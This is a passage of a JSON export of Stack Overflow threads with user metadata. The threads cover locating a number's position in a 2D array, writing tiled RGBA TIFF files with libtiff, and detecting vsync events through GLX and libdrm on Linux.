you flatten the 2d array to a linear array by concatenating all rows, is that linear array still ordered?"}, {"owner": {"reputation": 319259, "user_id": 1447675, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ziYmO.gif?s=128&g=1", "display_name": "Nina Scholz", "link": "https://stackoverflow.com/users/1447675/nina-scholz"}, "edited": false, "score": 0, "creation_date": 1461756403, "post_id": 36888335, "comment_id": 61341053, "body": "arrays are zero based."}, {"owner": {"reputation": 18798, "user_id": 4543207, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ed6f11c827fa7cef811f141a84cc14b?s=128&d=identicon&r=PG&f=1", "display_name": "Redu", "link": "https://stackoverflow.com/users/4543207/redu"}, "edited": false, "score": 0, "creation_date": 1461756469, "post_id": 36888335, "comment_id": 61341105, "body": "Are the elements in this 2D array are unique?"}, {"owner": {"reputation": 762, "user_id": 4984903, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/25d1ff59711d0850f5329f898a4a42f7?s=128&d=identicon&r=PG&f=1", "display_name": "Mukund Gandlur", "link": "https://stackoverflow.com/users/4984903/mukund-gandlur"}, "edited": false, "score": 2, "creation_date": 1461756518, "post_id": 36888335, "comment_id": 61341144, "body": "What data structure is storing them?"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461757727, "post_id": 36888335, "comment_id": 61341996, "body": "rows : (n + 1) / 2, cols : (n + 1) % 2 + 1, array[][m] : {(n+m-1)/m}-{(n+m-1)%m + 1}"}], "answers": [{"tags": [], "owner": {"reputation": 101365, "user_id": 4620771, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/BuWrj.jpg?s=128&g=1", "display_name": "Nenad Vracar", "link": "https://stackoverflow.com/users/4620771/nenad-vracar"}, "is_accepted": true, "score": 0, "last_activity_date": 1461757226, "last_edit_date": 1461757226, "creation_date": 1461756780, "answer_id": 36888560, "question_id": 36888335, "link": "https://stackoverflow.com/questions/36888335/how-to-get-the-position-of-a-number-in-matrix/36888560#36888560", "title": "how to get the position of a number in matrix?", "body": "<p>You could do something like this in javascript</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var data = [\r\n  [1, 2],\r\n  [3, 4],\r\n  [5, 6]\r\n];\r\n\r\nvar getPos = function(elem, data) {\r\n  var result = '';\r\n  data.forEach(function(value, index) {\r\n    value.forEach(function(v, i) {\r\n      if (v == elem) result += (index + 1) + '-' + (i + 1);\r\n    });\r\n  });\r\n  return result;\r\n}\r\n\r\nconsole.log(getPos(5, data));</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 734, "user_id": 3235081, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/iSyXb.png?s=128&g=1", "display_name": "Shady Programmer", "link": "https://stackoverflow.com/users/3235081/shady-programmer"}, "is_accepted": false, "score": 0, "last_activity_date": 1461757143, "last_edit_date": 1461757143, "creation_date": 1461756807, "answer_id": 36888569, "question_id": 36888335, "link": "https://stackoverflow.com/questions/36888335/how-to-get-the-position-of-a-number-in-matrix/36888569#36888569", "title": "how to get the position of a number in matrix?", "body": "<p>In C you could write a function that would implement the following pseudo-code:</p>\n\n<pre><code>//...\nfor(i=0 ; i&lt;ARRAY_SIZE ; i++)\n    {\n    if(array[i] == desired_num) \n    return i;\n    else\n    i++;\n    } \nreturn -1; // return error if desired_num not found\n//...\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "is_accepted": false, "score": 0, "last_activity_date": 1461757478, "creation_date": 1461757478, "answer_id": 36888807, "question_id": 36888335, "link": "https://stackoverflow.com/questions/36888335/how-to-get-the-position-of-a-number-in-matrix/36888807#36888807", "title": "how to get the position of a number in matrix?", "body": "<p>If it's a continuous ordered two-dimensional array you can do something like this to get the indices. (Notice <code>+1</code> as per your example)</p>\n\n<pre><code>int x = floor(number/2) +1:\nint y = (number+1)%2 +1;\n</code></pre>\n\n<p>If you are using arrays you should be able to jump the the right index without needing to loop like I see other answers suggesting.</p>\n\n<pre><code>array[x][y]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 18798, "user_id": 4543207, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ed6f11c827fa7cef811f141a84cc14b?s=128&d=identicon&r=PG&f=1", "display_name": "Redu", "link": "https://stackoverflow.com/users/4543207/redu"}, "is_accepted": false, "score": 0, "last_activity_date": 1461758223, "creation_date": 1461758223, "answer_id": 36889095, "question_id": 36888335, "link": "https://stackoverflow.com/questions/36888335/how-to-get-the-position-of-a-number-in-matrix/36889095#36889095", "title": "how to get the position of a number in matrix?", "body": "<p>You may do something like this</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var table = (new Array (10)).fill(new Array(10).fill(\"\")).map( e=&gt; e.map( f =&gt; ~~(Math.random()*1000))),\r\n  results = [];\r\nfunction findInTable(t, q){\r\n  var finds = {x:[],y:[]};\r\n  t.forEach( (a, i) =&gt; {j = a.indexOf(q); ~j &amp;&amp; (finds.x.push(j+1), finds.y.push(i+1))});\r\n  return finds;\r\n}\r\nresults = findInTable(table, 777);\r\n\r\ndocument.write(\"&lt;pre&gt;\" + table[0] + \"\\n\" + table[1] + \"\\n\" + table[2] + \"\\n\" + table[3] + \"\\n\" + table[4] + \"\\n\" + table[5] + \"\\n\" + table[6] + \"\\n\" + table[7] + \"\\n\" + table[8] + \"\\n\" + table[9] + \"\\n\" +\"&lt;/pre&gt;\");\r\ndocument.write(\"&lt;pre&gt; Searched for \" + 777+ \" and found at:\\n\" + JSON.stringify(results, null, 4) + \"&lt;/pre&gt;\");</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 3, "user_id": 4945494, "user_type": "registered", "profile_image": "https://graph.facebook.com/837081319717338/picture?type=large", "display_name": "Shuyuan Zhang", "link": "https://stackoverflow.com/users/4945494/shuyuan-zhang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 99, "favorite_count": 0, "accepted_answer_id": 36888560, "answer_count": 4, "score": -6, "last_activity_date": 1461758223, "creation_date": 1461756196, "question_id": 36888335, "link": "https://stackoverflow.com/questions/36888335/how-to-get-the-position-of-a-number-in-matrix", "title": "how to get the position of a number in matrix?", "body": "<p>How can I get the number's position by c or Javascript.\nIt is a ordered number array,like</p>\n\n<pre><code>1 2\n3 4\n5 6\n</code></pre>\n\n<p>how can I make a function to get the number 3 is 2-1,and 6 is 3-2</p>\n\n<p>Thank you very much!</p>\n"}, {"tags": ["c", "tiff", "rgba", "libtiff"], "comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1461756176, "post_id": 36888289, "comment_id": 61340897, "body": "Because you explicitly set the alpha to 100? Or is it <i>enitrely</i> transoarent - i.e., nothing at all?"}, {"owner": {"reputation": 31593, "user_id": 58082, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/61200477cf8983809ec152f484750204?s=128&d=identicon&r=PG", "display_name": "Pierre", "link": "https://stackoverflow.com/users/58082/pierre"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1461760505, "post_id": 36888289, "comment_id": 61344199, "body": "i&#39;ve tried different values for &#39;a&#39; : 0, 255, etc.. the image is always entirely transparent."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1461762322, "post_id": 36888289, "comment_id": 61345701, "body": "Try taking transparency out of the equation by creating a 3BPP image. If that works, then transparency is the problem."}, {"owner": {"reputation": 6899, "user_id": 1212012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/gmBY7.png?s=128&g=1", "display_name": "Mathieu", "link": "https://stackoverflow.com/users/1212012/mathieu"}, "edited": false, "score": 1, "creation_date": 1461765963, "post_id": 36888289, "comment_id": 61348706, "body": "You do not set what is the meaning of last byte: <a href=\"http://www.awaresystems.be/imaging/tiff/tifftags/samplesperpixel.html\" rel=\"nofollow noreferrer\">see this</a>. Try adding <code>TIFFSetField(tif, TIFFTAG_EXTRASAMPLES, EXTRASAMPLE_ASSOCALPHA);</code>"}, {"owner": {"reputation": 31593, "user_id": 58082, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/61200477cf8983809ec152f484750204?s=128&d=identicon&r=PG", "display_name": "Pierre", "link": "https://stackoverflow.com/users/58082/pierre"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1461769771, "post_id": 36888289, "comment_id": 61351804, "body": "@Rad @purplepsycho : thanks , your comments led me to the solution: I was missing: ` TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_RGB);`"}, {"owner": {"reputation": 1813, "user_id": 3011648, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/3xHwR.jpg?s=128&g=1", "display_name": "hello_there_andy", "link": "https://stackoverflow.com/users/3011648/hello-there-andy"}, "edited": false, "score": 0, "creation_date": 1489220233, "post_id": 36888289, "comment_id": 72584511, "body": "Why not post an answer then"}], "owner": {"reputation": 31593, "user_id": 58082, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/61200477cf8983809ec152f484750204?s=128&d=identicon&r=PG", "display_name": "Pierre", "link": "https://stackoverflow.com/users/58082/pierre"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 633, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1461756547, "creation_date": 1461756066, "last_edit_date": 1461756547, "question_id": 36888289, "link": "https://stackoverflow.com/questions/36888289/how-to-create-a-tiff-file-with-tiles", "title": "How to create a TIFF file with tiles", "body": "<p>I would like to create a large TIFF RGBA image using <strong>tiles</strong>. I wrote the following program which loops over the positions of the tiles, but the resulting image is always transparent. Why ?</p>\n\n<pre><code>#include &lt;math.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"tiffio.h\"\nint main(int argc,char** argv)\n{\nuint32 width=400, height=400;\nuint32 tileWidth=16, tileHeight=16;\nTIFF* tif = TIFFOpen(\"foo.tif\", \"w\");\nint i,j,x;\n\nint spp=4;\nint bps = 8;\nTIFFSetField(tif, TIFFTAG_IMAGEWIDTH, width);\nTIFFSetField(tif, TIFFTAG_IMAGELENGTH, height);\nTIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL,spp);//R G B A\nTIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, bps);\nTIFFSetField(tif, TIFFTAG_TILEWIDTH, tileWidth);\nTIFFSetField(tif, TIFFTAG_TILELENGTH, tileHeight);\nTIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);\nTIFFSetField(tif, TIFFTAG_ORIENTATION, ORIENTATION_TOPLEFT);\nint tilesize = tileWidth * tileHeight * bps/8 *  spp;\nuint8 *buf = malloc(tilesize);\n\nfor ( j = 0; j &lt; width; j += tileWidth) {\n    for ( i = 0; i &lt; height; i += tileHeight)\n        {\n           for ( x = 0; x &lt; tilesize; x+=spp)\n            {\n                uint8 a = 100;\n                buf[x+0] =a;\n                buf[x+1] =a;\n                buf[x+2] =a;\n                buf[x+3] =a;\n            }\n        if(TIFFWriteTile(tif, buf, i, j, 0, 0)&lt;0) exit(-1);\n        }\n    }\nfree(buf);\nTIFFClose(tif);\nreturn 0;\n} \n</code></pre>\n"}, {"tags": ["c", "x11", "framebuffer", "epoll", "glx"], "comments": [{"owner": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461756488, "post_id": 36888288, "comment_id": 61341120, "body": "Notice that I want to make it monothreaded. I could make a separated process that acts like a server which I could connect to and send a request &quot;wake me when vsync happened&quot;, this process could block on a glFinish and then send something via a socket or pipe or whatever, I would avoid it too."}, {"owner": {"reputation": 18493, "user_id": 388661, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/61df8d728c699c39c4c73507da598712?s=128&d=identicon&r=PG", "display_name": "davmac", "link": "https://stackoverflow.com/users/388661/davmac"}, "edited": false, "score": 0, "creation_date": 1461756506, "post_id": 36888288, "comment_id": 61341135, "body": "Why exactly do you want this? Could this be a case of <a href=\"http://meta.stackexchange.com/questions/66377/what-is-the-xy-problem\">the XY problem</a>?"}, {"owner": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "reply_to_user": {"reputation": 18493, "user_id": 388661, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/61df8d728c699c39c4c73507da598712?s=128&d=identicon&r=PG", "display_name": "davmac", "link": "https://stackoverflow.com/users/388661/davmac"}, "edited": false, "score": 0, "creation_date": 1461756651, "post_id": 36888288, "comment_id": 61341233, "body": "I&#39;m creating my own library/api, I want to have only one sync point for all incomming events of a process."}], "answers": [{"comments": [{"owner": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461758415, "post_id": 36888778, "comment_id": 61342510, "body": "I&#39;ve already seen this blog and code, I tryed to launch modeset as is, it said to me &quot;drm device /dev/dri/card0 does not support dumb buffers&quot;. I&#39;ve only /dev/dri/card0.  I&#39;ve not tryed more on drm side for the moment, I was wondering that was possible via X11 extensions..."}, {"owner": {"reputation": 18493, "user_id": 388661, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/61df8d728c699c39c4c73507da598712?s=128&d=identicon&r=PG", "display_name": "davmac", "link": "https://stackoverflow.com/users/388661/davmac"}, "reply_to_user": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461760548, "post_id": 36888778, "comment_id": 61344248, "body": "@LewisAnesa you don&#39;t need dumb buffers. You don&#39;t need to map a buffer at all; you just need to receive events (page flip event). The only open question is whether these events will indeed be delivered."}, {"owner": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461764812, "post_id": 36888778, "comment_id": 61347737, "body": "Yes, I&#39;ll continue these investigations after work (french time zone), perhaps activating v-sync via glXSwapIntervalEXT(1) induces these event to be delivered by dri device..?  I haven&#39;t seen any documents for libdrm such as the xlib documentation, if you see something, feel free to share."}, {"owner": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461787437, "post_id": 36888778, "comment_id": 61363779, "body": "Ough... I used <a href=\"https://fossies.org/dox/mesa-demos-8.3.0/glxgears_8c_source.html\" rel=\"nofollow noreferrer\">fossies.org/dox/mesa-demos-8.3.0/glxgears_8c_source.html</a> to make test and add time watch around glXSwapBuffers(dpy, win); line 342 and then, surprise!!! glXSwapBuffers blocks during around 16ms. notice that glXQueryExtensionsString(dpy, scrnum); line 585 doesn&#39;t return any swap extension. So I guess I can&#39;t double buffer or get vsync..."}, {"owner": {"reputation": 18493, "user_id": 388661, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/61df8d728c699c39c4c73507da598712?s=128&d=identicon&r=PG", "display_name": "davmac", "link": "https://stackoverflow.com/users/388661/davmac"}, "reply_to_user": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461837895, "post_id": 36888778, "comment_id": 61385107, "body": "Hmm. It may turn out that the only real option is to use threads (i.e. do your <code>glXSwapBuffers</code> call in a separate thread and signal the main thread somehow when it is done)."}, {"owner": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461850685, "post_id": 36888778, "comment_id": 61394825, "body": "Yes it seems to take this way, so I have to make a thread for each window hosting a gl port view since glXSwapBuffers is window attached and communicate with a pipe to each trhead I guess. Then I can take these pipes in epollfd... @davmac, If you want to add some lines on your post about this or another solution..."}, {"owner": {"reputation": 18493, "user_id": 388661, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/61df8d728c699c39c4c73507da598712?s=128&d=identicon&r=PG", "display_name": "davmac", "link": "https://stackoverflow.com/users/388661/davmac"}, "reply_to_user": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461861674, "post_id": 36888778, "comment_id": 61402953, "body": "@LewisAnesa Done, but see also recent revision."}, {"owner": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "edited": false, "score": 0, "creation_date": 1461921036, "post_id": 36888778, "comment_id": 61427784, "body": "Revision checked... It looks like this extension won&#39;t be able on arm procs such as raspberry pi, or other..."}], "tags": [], "owner": {"reputation": 18493, "user_id": 388661, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/61df8d728c699c39c4c73507da598712?s=128&d=identicon&r=PG", "display_name": "davmac", "link": "https://stackoverflow.com/users/388661/davmac"}, "is_accepted": true, "score": 2, "last_activity_date": 1461863322, "last_edit_date": 1461863322, "creation_date": 1461757394, "answer_id": 36888778, "question_id": 36888288, "link": "https://stackoverflow.com/questions/36888288/glx-vsync-event/36888778#36888778", "title": "GLX Vsync event", "body": "<p>It looks like you can use the libdrm API to see vsync events. See <a href=\"https://dvdhrm.wordpress.com/2012/12/21/advanced-drm-mode-setting-api/\" rel=\"nofollow\">this blog entry</a>, and in particular <a href=\"https://github.com/dvdhrm/docs/blob/master/drm-howto/modeset-vsync.c\" rel=\"nofollow\">this example code</a>. A comment from the code explains how it works:</p>\n\n<pre><code>/* (...)\n * The DRM_MODE_PAGE_FLIP_EVENT flag tells drmModePageFlip() to send us a\n * page-flip event on the DRM-fd when the page-flip happened. The last argument\n * is a data-pointer that is returned with this event.\n * (...)\n */\n</code></pre>\n\n<p>You need to set up a page-flip event handler to be notified when a vsync occurs, which will be called by the <code>drmHandleEvent</code> method (from libdrm) which you can call when there is activity on the drm file descriptor.</p>\n\n<p>However, mapping all this into an X client might prove difficult or impossible. It <em>may</em> be that you can open the drm device yourself and just listen for vsync events (without attempting to set the mode etc), but this might also prove impossible. Pertinent code:</p>\n\n<pre><code>drmEventContext ev;\nmemset(&amp;ev, 0, sizeof(ev));\nev.version = DRM_EVENT_CONTEXT_VERSION;\nev.page_flip_handler = modeset_page_flip_event;\n\n// When file descriptor input is available:\ndrmHandleEvent(fd, &amp;ev);\n// If above works, \"modeset_page_flip_event\" will be called on vertical refresh.\n</code></pre>\n\n<p>The problem is that a page flip event only seems to be generated if you have actually issued a page flip (buffer swap) request. Presumably it would be the X server that issued such requests, but it doesn't even necessarily flag that it wants to be notified when the vsync actually occurs (i.e. uses the <code>DRM_MODE_PAGE_FLIP_EVENT</code> flag).</p>\n\n<p>There's also the difficulty of opening the correct dri device (<code>/dev/dri/card0</code> or <code>/dev/dri/card1</code> or ...?)</p>\n\n<p>Given the difficulty/unreliability/general unworkability of all the above, the easiest solution is probably to:</p>\n\n<ol>\n<li>Use a separate thread to wait for vsync using standard GL calls. According to <a href=\"https://www.opengl.org/wiki/Swap_Interval\" rel=\"nofollow\">this page on the OpenGL wiki</a> you should use <code>glXSwapIntervalEXT(1)</code> to enable vsync, then <code>glXSwapBuffers</code> and <code>glFinish</code> to ensure that the vertical retrace actually occurs.</li>\n<li>Then, notify the main thread that vertical retrace occurred. You can do this by sending data to a pipe or, on Linux, use an <code>eventfd</code>.</li>\n</ol>\n\n<p><strong>Update</strong>:</p>\n\n<p>You may be able to use the <a href=\"https://www.opengl.org/registry/specs/INTEL/swap_event.txt\" rel=\"nofollow\">GLX_INTEL_swap_event extension</a>:</p>\n\n<blockquote>\n  <p>Accepted by the  parameter of glXSelectEvent and returned in the  parameter of glXGetSelectedEvent:</p>\n  \n  <p>GLX_BUFFER_SWAP_COMPLETE_INTEL_MASK 0x04000000</p>\n  \n  <p>Returned in the  field of a \"swap complete\" event:</p>\n  \n  <p>GLX_EXCHANGE_COMPLETE_INTEL       0x8180<br>\n  GLX_COPY_COMPLETE_INTEL           0x8181<br>\n  GLX_FLIP_COMPLETE_INTEL           0x8182<br></p>\n</blockquote>\n\n<p>...</p>\n\n<blockquote>\n  <p>A client can ask to receive swap complete GLX events on a window.\n  When an event is received, the caller can determine what kind of swap occurred by checking the event_type field.</p>\n</blockquote>\n\n<p>This means that, if the extension is supported, you can receive swap notifications (which correspond to vertical retrace if vsync is enabled) via regular X events, which you'll see on the X connection file descriptor.</p>\n"}, {"tags": [], "owner": {"reputation": 1412, "user_id": 3809561, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/RTS59.jpg?s=128&g=1", "display_name": "yyny", "link": "https://stackoverflow.com/users/3809561/yyny"}, "is_accepted": false, "score": 1, "last_activity_date": 1589018768, "creation_date": 1589018768, "answer_id": 61694969, "question_id": 36888288, "link": "https://stackoverflow.com/questions/36888288/glx-vsync-event/61694969#61694969", "title": "GLX Vsync event", "body": "<p>Unfortunately, from looking all over the web for extensions and interfaces to poll vsync <sub>[1]</sub>, I've found the best (least-resource intensive) method that is likely to be available is the following:</p>\n\n<ol>\n<li>Query vtrace rate (every 16.666ms for a 60hz monitors).</li>\n<li><code>nanosleep</code> some portion of that delay (say 15ms) depending on the querying accuracy and the expected variance of the vsync pulse.</li>\n<li><code>clock_gettime</code> our remaining time-quota and (optionally) do some real-time computing if we can. Typically computation should be done at step 7.</li>\n<li>Busy-wait for vsync using one of the methods noted below. Add <code>pause</code> instructions.</li>\n<li>Immediately <code>clock_gettime</code> to ensure accurate sleep delay on next cycle.</li>\n<li>Do drawing or pixel-querying.</li>\n<li>Do any other computations, use threading, watchdogs or real-time computing.</li>\n<li>Repeat step 2.</li>\n</ol>\n\n<p>You could dynamically increase the delay time if you trust your own code (But be too agressive and you start dropping frames).\nIf you really need a reliable poll and can't spinlock at all, you can do all this in another thread. The <code>nanosleep</code> should ensure the kernel doesn't schedule your thread for most of its lifetime.</p>\n\n<p>You'll have to calibrate the delay but you can probably eyeball it. 15ms is extremely conservative and pretty much guaranteed to work.\nThe querying method I use results in a variance of around 16.665-16.667, so any delay below that should be enough.\nIt all depends on how much you trust your <code>nanosleep</code> implementation and your thread scheduler. Use a real-time scheduling policy if your kernel supports it (Or don't worry about any of this, take the easy way out and busy-wait like everyone else).</p>\n\n<p>This is the method most screen-recorders are using.</p>\n\n<h1>Querying Vblank frequency</h1>\n\n<p>If your driver supports it, you can call <code>glXGetVideoSyncSGI</code> (from the <code>GLX_SGI_video_sync</code> extension) repeatedly and time with <code>clock_gettime</code> to query vblank rate (e.g. 16.666ms).\nAlternatives to finding vsync rate are <code>glXGetSwapIntervalMESA</code> and <code>glXQueryDrawable(dpy, drawable, GLX_SWAP_INTERVAL_EXT, &amp;interval)</code> (from <code>GLX_MESA_swap_control</code> and <code>GLX_EXT_swap_control</code> respectively). Benefits of <code>GLX_SGI_video_sync</code> are that you only need one extension (see next section).</p>\n\n<p><code>glXGetSyncValuesOML</code> from the <code>GLX_OML_sync_control</code> extension returns the same counter, but is probably less efficient because it has to fetch other irrelevant values. It might potentially return a more accurate vsync rate. It's also not available on my system, so I don't know how portable it is.</p>\n\n<h1>Waiting for Vsync</h1>\n\n<p>You can set a timer after each frame for say ~15ms after the start of the current frame (Use <code>clock_nanosleep</code> and non-relative time if you can), and then busy-wait the rest until the <code>glXGetVideoSyncSGI</code> counter changes value. Connecting the timer to a poll/event loop should then be trivial.</p>\n\n<p>You could maybe do some real-time computing inside the busy loop if you're brave enough.</p>\n\n<p><code>glXWaitForMscOML</code> from <code>GLX_OML_sync_control</code> does the same thing and might have some optimizations, but it's not available on my system and I wouldn't be surprised if it is just busy-waiting like everything else. I also don't know how reliable it is. There are most certainly other methods to wait for vsync too (MESA/DRM/KMS), but they are even less portable than <code>GLX_SGI_video_sync</code>, and once again, they typically busy-wait.</p>\n\n<p>Even if no frame counter is available, you could assume that <code>glXSwapBuffers</code> blocks and still do something similar (Note that on all drivers I know of, users may turn off the blocking behaviour manually. Check out <code>GLX_EXT_swap_control</code> to try and override this behaviour). At this point it might just be better to loop calling <code>glXSwapBuffers</code> in another thread, though.</p>\n\n<p>If all else fails, you can busy-wait on <code>clock_gettime</code> instead. <code>nanosleep</code> used to do this, but nowadays you have to do it yourself. If you're using this method, you should probably hardcode well-known vsync values instead of relying on querying (any variance in sleep delay might result in dropped frames, that said vsync has natural variance anyway due to the asynchronous nature of the hardware so reliable vsync without driver support might be impossible).</p>\n\n<p>The \"compton\" open-source compositor manager mentions the following methods to wait for <code>vsync</code>:</p>\n\n<ul>\n<li><code>DRM_IOCTL_WAIT_VBLANK</code></li>\n</ul>\n\n<p>Linux-specific.\nVery reliable for waiting, also doesn't require OpenGL.\nProperly suspends thread instead of busy-waiting.\nUnfortunately, <code>_DRM_VBLANK_SIGNAL</code> is not implemented and <code>_DRM_VBLANK_EVENT</code> is broken, so a blocking wait is still the only valid use-case.\nDRM actually <em>does</em> give accurate vsync pulses for applications that manually swap buffers, but this can hardly be called <code>lightweight</code>. Also, if you're swapping buffers anyway, you might as well just use <code>glXSwapBuffers</code>.\nRecommended if you need high performance and don't care about portability.</p>\n\n<ul>\n<li><code>SGI_video_sync</code></li>\n</ul>\n\n<p>Cross-platform. Almost universally available. This is what I recommend.</p>\n\n<ul>\n<li><code>OML_sync_control</code></li>\n</ul>\n\n<p>Recommended if it's available.</p>\n\n<ul>\n<li><code>EXT_swap_control</code></li>\n<li><code>SGI_swap_control</code></li>\n<li><code>MESA_swap_control</code></li>\n</ul>\n\n<p>I would not recommend this. This is the <code>glXSwapBuffers</code> approach. Most drivers support this, but it's also resource-intensive and prone to break if driver settings change. Most of these implementations spinlock.</p>\n\n<h1>Conclusion</h1>\n\n<p>Unfortunately, it seems like there won't be a resource-friendly way to poll vsync anytime soon. The video driver clearly has to keep track of vsync to know when to send the next frame, so there's no technical reason why there is no easy interface to poll vsync pulse available anywhere, but unfortunately, consensus from linux, nvidia and khronos seems to be \"nobody needs this\".</p>\n\n<p>Typically vtrace pulses are very important for pixel querying (case point: literally every compositor manager ever has a bug report or mail-list thread about vsync), but it also has uses for real-time computing.</p>\n\n<p>[1] vsync a.k.a. vtrace a.k.a. buffer swap a.k.a. frame counter increment a.k.a. frame round-trip</p>\n"}], "owner": {"reputation": 70, "user_id": 6090734, "user_type": "registered", "accept_rate": 100, "profile_image": 